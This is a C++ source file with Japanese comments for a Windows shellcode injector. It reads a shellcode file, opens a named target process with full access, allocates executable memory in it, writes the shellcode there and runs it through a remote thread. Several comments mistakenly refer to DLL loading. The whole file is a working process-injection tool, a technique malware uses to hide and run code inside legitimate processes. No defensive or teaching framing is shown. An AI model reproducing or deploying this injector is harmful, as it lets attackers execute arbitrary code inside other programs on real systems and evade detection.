// ファイル名：main.cpp
// 説明：任意のプロセスメモリにシェルコードを書き込んで実行するプログラムです
// 使用方法：[インジェクター名] [プロセス名] [シェルコードパス]

#include"injector.h"

// エントリポイント
// argv[1]：ターゲットプロセス名
// argv[2]：DLLパス
// 戻り値：成功した場合は0、失敗した場合は1
int wmain(int argc, wchar_t* argv[]) {

	// 引数の数をチェック
	if (argc != 3) {
		std::cout << "使用方法：[このプログラムの実行可能ファイル名] [プロセス名] [シェルコードパス]" << std::endl;
		return 1;
	}

	LPCWSTR processName = argv[1];
	LPCWSTR shellcodePath = argv[2];

	// 引数の内容をチェック
	if (wcslen(processName) == 0) {
		std::cerr << "[-] プロセス名が空です" << std::endl;
		return 1;
	}

	if (wcslen(shellcodePath) == 0) {
		std::cerr << "[-] シェルコードパスが空です" << std::endl;
		return 1;
	}

	// プロセス名からプロセスIDを取得
	DWORD processId = 0;
	BOOL successGetPid = GetProcessIdToProcessName(processName, processId);
	if (!successGetPid) {
		std::cerr << "[-] プロセス名からプロセスIDを取得できませんでした" << std::endl;
		return 1;
	}

	// ファイルのバイナリデータを読み取る
	DWORD shellcodeFileSize = 0;
	LPVOID shellcodeAddress = ReadFileBytes(shellcodePath, shellcodeFileSize);
	if (shellcodeAddress == nullptr) {
		std::cerr << "[-] シェルコードの読み込みに失敗しました" << std::endl;
		return 1;
	}

	// 各種情報を表示
	std::wcout
		<< "[シェルコードインジェクター]\n"
		<< "プロセス名：" << processName << "\n"
		<< "プロセスID：" << processId << "\n"
		<< "シェルコードパス：" << shellcodePath << std::endl;


	// プロセスハンドルを取得
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	if (processHandle == NULL) {
		std::cerr << "[-] OpenProcessが失敗しました。Error code: " << GetLastError() << std::endl;
		return 1;
	}
	std::cout << "[+] プロセスハンドルを取得しました" << std::endl;

	// DLLパスを書き込むメモリ領域を確保
	LPVOID shellcodeMemory = VirtualAllocEx(processHandle, nullptr, shellcodeFileSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellcodeMemory == NULL) {
		std::cerr << "[-] VirtualAllocExが失敗しました。Error code: " << GetLastError() << std::endl;
		CloseHandle(processHandle);
		return 1;
	}
	std::cout << "[+] メモリを確保しました " << PrintAddress(shellcodeMemory) << std::endl;

	// DLLパスを書き込む
	BOOL successWriteMemory = WriteProcessMemory(processHandle, shellcodeMemory, shellcodeAddress, shellcodeFileSize, nullptr);
	if (successWriteMemory == 0) {
		std::cerr << "[-] WriteProcessMemoryが失敗しました。Error code: " << GetLastError() << std::endl;
		VirtualFreeEx(processHandle, shellcodeMemory, 0, MEM_RELEASE);
		CloseHandle(processHandle);
		return 1;
	}
	std::cout << "[+] シェルコードを書き込みました " << std::endl;

	// リモートスレッドを作成してDLLをロード
	HANDLE threadHandle = CreateRemoteThread(processHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(shellcodeMemory), nullptr, 0, nullptr);
	if (threadHandle == NULL) {
		std::cerr << "[-] CreateRemoteThreadが失敗しました。Error code: " << GetLastError() << std::endl;
		VirtualFreeEx(processHandle, shellcodeMemory, 0, MEM_RELEASE);
		CloseHandle(processHandle);
		return 1;
	}
	std::cout << "[+] リモートスレッドを作成しました " << std::endl;

	// リモートスレッドの終了を待機してからクリーンアップ
	WaitForSingleObject(threadHandle, INFINITE);
	VirtualFreeEx(processHandle, shellcodeMemory, 0, MEM_RELEASE);
	CloseHandle(threadHandle);
	CloseHandle(processHandle);
	return 0;
}